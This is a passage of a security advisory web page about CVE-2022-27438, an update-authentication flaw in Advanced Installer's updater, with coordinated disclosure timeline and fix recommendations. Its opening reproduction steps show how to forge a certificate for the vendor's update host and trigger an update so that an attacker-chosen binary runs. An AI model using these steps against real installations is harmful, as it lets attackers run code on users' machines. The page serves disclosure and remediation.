<li>e.g. using <code>openssl req -new -x509 -keyout www.advancedinstaller.com.pem -out www.advancedinstaller.com.pem -days 365 -nodes -subj "/CN=www.advancedinstaller.com"</code></li>
</ul>
</li>
<li>Run the proof of concept script on the attacker;</li>
<li>Start Advanced Installer to trigger update automatically, or
<ul>
<li>wait for 2 days to trigger update automatically, or</li>
<li>trigger update manually through the application menu/settings, or</li>
<li>trigger update manually by starting the update application at <code>C:\Program Files (x86)\Caphyon\Advanced Installer 19.3\bin\x86\updater.exe</code>;</li>
</ul>
</li>
<li>Proceed with the Windows untrusted certificate security alert (if applicable).</li>
</ol>
<p>As a result, the binary specified in <code>CustomDetection</code> with parameters specified in <code>CustomDetectionParameters</code> is executed in the context of the current user.</p>
<p><p align=center>
<img loading=lazy src=proof.png alt="<code>CustomDetection</code> with parameters specified in <code>CustomDetectionParameters</code> is executed in the context of the current user">
</p>
</p>
<h1 id=recommendations>Recommendations<a hidden class=anchor aria-hidden=true href=#recommendations>#</a></h1>
<p>The vulnerability presents itself because there is insufficient authentication from the update server. This vulnerability is fixed in Advanced Installer 19.4.</p>
<p>We recommend vendors of affected products to build the product using Advanced Installer 19.4 and release this update as soon as possible. Mention the update and CVE-2022-27438 in the changelog.</p>
<p>We recommend users of affected products to update to a fixed version as soon as possible. Refer to the website of the affected product for updates and changelogs (look for &ldquo;CVE-2022-27438 fix&rdquo;).</p>
<h1 id=report-timeline>Report Timeline<a hidden class=anchor aria-hidden=true href=#report-timeline>#</a></h1>
<ul>
<li><strong>11-02-2022:</strong> Initial contact with the vendor via <a href=mailto:support@advancedinstaller.com>support@advancedinstaller.com</a>.</li>
<li><strong>21-02-2022:</strong> Vendor releases version 19.2 which is still vulnerable.</li>
<li><strong>04-03-2022:</strong> Gerr.re sent reminder to <a href=mailto:support@advancedinstaller.com>support@advancedinstaller.com</a> after no response.</li>
<li><strong>18-03-2022:</strong> Gerr.re sent a request to Mitre for a CVE ID.</li>
<li><strong>18-03-2022:</strong> Gerr.re sent final reminder to <a href=mailto:support@advancedinstaller.com>support@advancedinstaller.com</a> after no response.</li>
<li><strong>21-03-2022:</strong> Vendor releases version 19.3 which is still vulnerable.</li>
<li><strong>21-03-2022:</strong> Vendor replies, requesting technical details.</li>
<li><strong>21-03-2022:</strong> A draft report with technical details and a proof of concept application was sent to the vendor.</li>
<li><strong>22-03-2022:</strong> Vendor acknowledges reception of technical details.</li>
<li><strong>23-03-2022:</strong> Vendor confirms the vulnerability.</li>
<li><strong>24-03-2022:</strong> Vendor shares release candidate 19.4 and requests a retest on the fixes.</li>
<li><strong>25-03-2022:</strong> Gerr.re confirms the fixes and sends further security recommendations.</li>
<li><strong>29-03-2022:</strong> Vendor sends questions regarding security recommendations.</li>
<li><strong>06-04-2022:</strong> Gerr.re sends additional information to answer the questions.</li>
<li><strong>26-04-2022:</strong> Vendor releases <a href=https://www.advancedinstaller.com/release-19.4.html>version 19.4</a> that includes the fixes.</li>
<li><strong>28-04-2022:</strong> Mitre assigns CVE-2022-27438.</li>
<li><strong>01-06-2022:</strong> Coordinated release.</li>
<li><strong>12-06-2022:</strong> Gerr.re sends remarks regarding false assumptions made in the vendor advisory.</li>
<li><strong>20-06-2022:</strong> Updated public advisory with link to vendor advisory.</li>
</ul>
<h1 id=disclaimer>Disclaimer<a hidden class=anchor aria-hidden=true href=#disclaimer>#</a></h1>
<p>The contents of this advisory are copyright © 2022 Gerr.re, and are licensed under a Creative Commons Attribution-NoDerivatives 4.0 International (<a href=https://creativecommons.org/licenses/by-nd/4.0/>CC BY-ND 4.0</a>)</p>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://gar-re.github.io/tags/cwe_494/>cwe_494</a></li>
<li><a href=https://gar-re.github.io/tags/coordinated_release/>coordinated_release</a></li>
</ul>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share CVE-2022-27438 on twitter" href="https://x.com/intent/tweet/?text=CVE-2022-27438&url=https%3a%2f%2fgar-re.github.io%2fposts%2fcve-2022-27438%2f&hashtags=cwe_494%2ccoordinated_release"><svg id="svg5" xmlns:svg="http://www.w3.org/2000/svg" height="30" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 1250 1150" fill="currentcolor"><path id="path1009" d="M283.94 167.31l386.39 516.64L281.5 1104h87.51l340.42-367.76L984.48 1104h297.8L874.15 558.3l361.92-390.99h-87.51l-313.51 338.7-253.31-338.7H283.94zm128.69 64.46h136.81l604.13 807.76h-136.81L412.63 231.77z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2025 <a href=https://gar-re.github.io/>Gar Reversing</a></span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerHTML='copy';function d(){a.innerHTML='copied!',setTimeout(()=>{a.innerHTML='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>